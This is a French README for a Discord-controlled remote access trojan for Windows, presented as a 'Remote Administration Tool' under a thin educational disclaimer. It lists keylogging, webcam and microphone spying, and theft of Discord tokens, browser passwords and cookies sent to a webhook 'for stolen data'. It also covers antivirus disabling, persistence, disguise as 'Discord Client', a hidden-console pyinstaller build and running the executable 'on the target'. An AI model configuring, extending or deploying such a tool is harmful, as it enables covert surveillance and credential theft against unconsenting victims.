# 🚀 RAT Bot - Remote Administration Tool

## ⚠️ AVERTISSEMENT LEGAL
- **Usage exclusivement éducatif et tests de pénétration autorisés**
- **L'utilisation non autorisée est illégale et passible de poursuites**
- **Les auteurs déclinent toute responsabilité en cas d'usage malveillant**

## 📋 DESCRIPTION
Bot Discord permettant l'administration complète à distance d'un système Windows avec plus de 50 commandes différentes.

## 🛠️ FONCTIONNALITÉS COMPLÈTES

### 🔍 SURVEILLANCE SYSTÈME
- `!info` - Informations système détaillées
- `!screen` - Capture d'écran instantanée
- `!webcam` - Photo via webcam
- `!processus` - Liste des processus en cours
- `!audio [sec]` - Enregistrement microphone
- `!listen [sec]` - Capture audio système

### ⌨️ KEYLOGGER & INPUT
- `!keylog_start/stop` - Contrôle keylogger
- `!write [texte]` - Écriture clavier à distance
- `!click/unlock` - Blocage/déblocage souris

### 📁 GESTION FICHIERS
- `!ls [dossier]` - Navigation fichiers
- `!download [fichier]` - Téléchargement
- `!upload` - Upload via attachment Discord
- `!delete [fichier]` - Suppression fichiers

### 🌐 CONTRÔLE NAVIGATION
- `!site [url]` - Ouverture sites web
- `!google [recherche]` - Recherche Google
- `!youtube [recherche]` - Recherche YouTube

### 🔐 VOL DE DONNÉES
- `!steal` - Vol complet (ZIP webhook)
- `!tokens` - Tokens Discord
- `!passwords` - Mots de passe navigateurs
- `!history` - Historique navigation
- `!cookie` - Données complètes navigateurs
- `!telegram` - Numéro Telegram

### ⚡ CONTRÔLE SYSTÈME
- `!cmd [commande]` - Exécution CMD
- `!powershell [commande]` - PowerShell
- `!shutdown/restart` - Arrêt/redémarrage
- `!lock/sleep` - Verrouillage/veille
- `!antivirus` - Désactivation protection
- `!volume [0-100]` - Contrôle volume
- `!mute/unmute` - Gestion audio

### 🎭 TROLL & FUN
- `!error [message]` - Fausse erreur Windows
- `!bsod` - Faux écran bleu
- `!disco` - Clignotement écran
- `!wall [texte]` - Fond d'écran personnalisé
- `!spam` - Ouverture multiple fenêtres
- `!crash` - Surcharge système

### ⚙️ PERSISTANCE
- `!persist/unpersist` - Démarrage automatique
- Auto-camouflage en "Discord Client"
- Masquage console automatique

## 📥 INSTALLATION & CONFIGURATION

### PRÉREQUIS
```python
# Configuration requise dans le code
CHANNEL_ID = 123456789012345678  # Remplacez par l'ID du canal
WEBHOOK_URL = "https://discord.com/api/webhooks/..."  # Webhook pour données volées
bot.run('VOTRE_TOKEN_BOT_DISCORD')  # Token du bot Discord

COMPILATION
# compiler.bat
pyinstaller --onefile --noconsole --hidden-import=discord --hidden-import=pyaudio [...] rat.py

DÉPLOIEMENT
Créer un bot sur https://discord.com/developers

Configurer CHANNEL_ID et WEBHOOK_URL

Compiler avec compiler.bat

Exécuter RAT.exe sur la cible

🎯 MODES D'UTILISATION
🕵️ MODE FURTIF
Console masquée automatiquement

Processus nommé "Discord Client"
